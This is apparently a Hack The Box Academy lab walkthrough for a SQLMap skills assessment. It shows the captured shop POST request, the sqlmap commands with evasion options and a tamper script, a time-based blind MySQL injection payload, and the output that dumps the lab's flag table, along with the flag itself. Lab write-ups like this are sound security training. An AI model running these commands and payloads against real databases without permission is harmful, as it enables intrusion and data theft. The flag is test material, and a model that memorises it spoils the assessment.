
## Question 1

### "What's the contents of table final_flag?"

After spawning the target machine, students need to visit its website's root page and inspect the web application for possible attack vectors:

![SQLMap_Essentials_image_18.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_18.png)

Students then need to click all buttons while having the Network tab of the Web Developer tools open, searching for a `POST` request that can be abused. The only button that sends a `POST` request is under `Catalog` -> `Shop`, specifically, the `ADD TO CART +` button on an item:

![SQLMap_Essentials_image_19.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_19.png)

Therefore, students need to select the request and copy the raw request headers, in addition to the raw request payload, and save them into a file:

![SQLMap_Essentials_image_20.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_20.png)

![SQLMap_Essentials_image_21.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_21.png)

The final request file that will be provided to `sqlmap` is:

  Skills Assessment

```shell-session
POST /action.php HTTP/1.1
Host: STMIP:STMPO
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 8
Origin: http://178.62.91.22:31147
DNT: 1
Connection: keep-alive
Referer: http://STMIP:STMPO/shop.html
Sec-GPC: 1

{"id":1}
```

Once students have saved the request into a file, they need to launch `sqlmap` providing it to the option `-r`. After trial and error, students will come to know that the options `--level 5`, `--risk 3`, `--random-agent`, `--tamper=between`, and `--technique=t` are all required to bypass the protections put forth to protect the database. Afterward, when students run `sqlmap` with these options, they will discover the database `production` and the table `final_flag` within it:

Code: shell

```shell
sqlmap -r request.req --batch --dump --level 5 --risk 3 --random-agent --tamper=between --technique=t
```

  Skills Assessment

```shell-session
┌┌─[eu-academy-1]─[10.10.14.228]─[htb-ac413848@htb-jhizwe8dgn]─[~]
└──╼ [★]$ sqlmap -r request.req --batch --dump --level 5 --risk 3 --random-agent --tamper=between --technique=t
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.6.8#stable}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:42:13 /2022-11-29/

[18:42:13] [INFO] parsing HTTP request from 'request.req'
[18:42:13] [INFO] loading tamper module 'between'
[18:42:13] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.8.1) Gecko/20060916 Firefox/2.0b2' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[18:42:14] [INFO] resuming back-end DBMS 'mysql' 
[18:42:14] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON id ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id":"1 AND (SELECT 7108 FROM (SELECT(SLEEP(5)))iDXK)"}

<SNIP>

[18:42:29] [INFO] adjusting time delay to 1 second due to good response times
production
[18:43:02] [INFO] fetching tables for database: 'production'
[18:43:02] [INFO] fetching number of tables for database 'production'
[18:43:02] [INFO] retrieved: 5
[18:43:04] [INFO] retrieved: categories
[18:43:31] [INFO] retrieved: brands
[18:43:49] [INFO] retrieved: products
[18:44:18] [INFO] retrieved: order_items
[18:44:55] [INFO] retrieved: final_flag
[18:45:29] [INFO] fetching columns for table 'order_items' in database 'production'
[18:45:29] [INFO] retrieved: ^C
```

Therefore, instead of letting `sqlmap` fetch unwanted data, students can stop it (`Ctrl` + `C`) and only make it fetch the table `final_flag` within the database `production`, finding the flag `HTB{n07_50_h4rd_r16h7?!}`:

Code: shell

```shell
sqlmap -r request.req --batch --dump --level 5 --risk 3 --random-agent --tamper=between --technique=t -D production -T final_flag
```

  Skills Assessment

```shell-session
┌─[eu-academy-1]─[10.10.14.228]─[htb-ac413848@htb-7lpyzphcoo]─[~]
└──╼ [★]$ sqlmap -r request.req --batch --dump --level 5 --risk 3 --random-agent --tamper=between --technique=t -D production -T final_flag
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.6.8#stable}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:54:34 /2022-11-29/

[18:54:34] [INFO] parsing HTTP request from 'request.req'
[18:54:34] [INFO] loading tamper module 'between'
[18:54:34] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.2a1pre) Gecko/20110208 Firefox/4.2a1pre' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[18:54:34] [INFO] testing connection to the target URL

<SNIP>

sqlmap identified the following injection point(s) with a total of 69 HTTP(s) requests:
---
Parameter: JSON id ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id":"1 AND (SELECT 7393 FROM (SELECT(SLEEP(5)))ZWNA)"}
---
[18:55:40] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[18:55:40] [INFO] the back-end DBMS is MySQL
[18:55:40] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[18:55:45] [INFO] fetching columns for table 'final_flag' in database 'production'
[18:55:45] [INFO] retrieved: 
[18:55:55] [INFO] adjusting time delay to 1 second due to good response times
2
[18:55:55] [INFO] retrieved: id
[18:56:01] [INFO] retrieved: content
[18:56:27] [INFO] fetching entries for table 'final_flag' in database 'production'
[18:56:27] [INFO] fetching number of entries for table 'final_flag' in database 'production'
[18:56:27] [INFO] retrieved: 1
[18:56:28] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)       
HTB{n07_50_h4rd_r16h7?!}
[18:57:57] [INFO] retrieved: 1
Database: production
Table: final_flag
[1 entry]
+----+--------------------------+
| id | content                  |
+----+--------------------------+
| 1  | HTB{n07_50_h4rd_r16h7?!} |
+----+--------------------------+
```

Answer: {hidden}